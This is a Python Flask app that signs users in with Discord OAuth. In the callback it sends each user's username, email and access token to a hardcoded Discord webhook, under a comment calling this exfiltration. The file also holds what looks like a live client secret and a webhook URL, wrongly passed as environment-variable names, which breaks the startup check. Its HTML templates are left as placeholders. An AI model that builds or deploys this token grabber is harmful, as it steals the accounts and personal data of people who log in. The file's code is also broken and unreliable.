import os
from flask import Flask, request, redirect, session, render_template_string
import requests
import secrets

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ---------- Read credentials from environment variables ----------
CLIENT_ID = os.environ.get("1542365664206127104")
CLIENT_SECRET = os.environ.get("bemEtEX3oyZeUDtNbM0LY1-iB9XcbGlc")
REDIRECT_URI = os.environ.get("REDIRECT_URI")   # This will be your Render URL + /callback
WEBHOOK_URL = os.environ.get("https://discord.com/api/webhooks/1542336768706216036/-0-QlKsVZdBAqjgl5VxLr7rB87bvePDgL2y1w2lRoekZWRgJoGU-dEUazltmgThSGIwf")     # Your Discord webhook URL

if not CLIENT_ID or not CLIENT_SECRET or not REDIRECT_URI:
    raise ValueError("Missing environment variables. Set DISCORD_CLIENT_ID, DISCORD_CLIENT_SECRET, REDIRECT_URI, and WEBHOOK_URL.")
# ----------------------------------------------------------------

DISCORD_AUTHORIZE_URL = "https://discord.com/api/oauth2/authorize"
DISCORD_TOKEN_URL = "https://discord.com/api/oauth2/token"
DISCORD_USER_URL = "https://discord.com/api/users/@me"

# ----- HTML templates (same as before, I'll keep them short) -----
LOGIN_PAGE = """<!DOCTYPE html>..."""  # paste the whole LOGIN_PAGE from previous code
DASHBOARD_PAGE = """<!DOCTYPE html>..."""  # paste the whole DASHBOARD_PAGE from previous code

@app.route('/')
def home():
    return render_template_string(LOGIN_PAGE)

@app.route('/login')
def login():
    state = secrets.token_urlsafe(16)
    session['oauth_state'] = state
    auth_url = (
        f"{DISCORD_AUTHORIZE_URL}?"
        f"client_id={CLIENT_ID}&"
        f"redirect_uri={REDIRECT_URI}&"
        f"response_type=code&"
        f"scope=identify%20email&"
        f"state={state}"
    )
    return redirect(auth_url)

@app.route('/callback')
def callback():
    if request.args.get('state') != session.get('oauth_state'):
        return "State mismatch. Possible CSRF.", 400
    code = request.args.get('code')
    if not code:
        return "No code provided.", 400

    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(DISCORD_TOKEN_URL, data=data, headers=headers)
    if response.status_code != 200:
        return f"Token exchange failed: {response.text}", 400

    token_data = response.json()
    access_token = token_data.get('access_token')

    user_response = requests.get(
        DISCORD_USER_URL,
        headers={'Authorization': f'Bearer {access_token}'}
    )
    if user_response.status_code != 200:
        return "Failed to get user info.", 400
    user_data = user_response.json()

    # Exfiltrate to webhook (self-test)
    try:
        payload = {
            "content": f"**User:** {user_data['username']}#{user_data['discriminator']}\n**Email:** {user_data.get('email', 'N/A')}\n**Token:** `{access_token}`"
        }
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass

    return render_template_string(
        DASHBOARD_PAGE,
        username=user_data['username'],
        discriminator=user_data['discriminator'],
        webhook_url=WEBHOOK_URL
    )

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)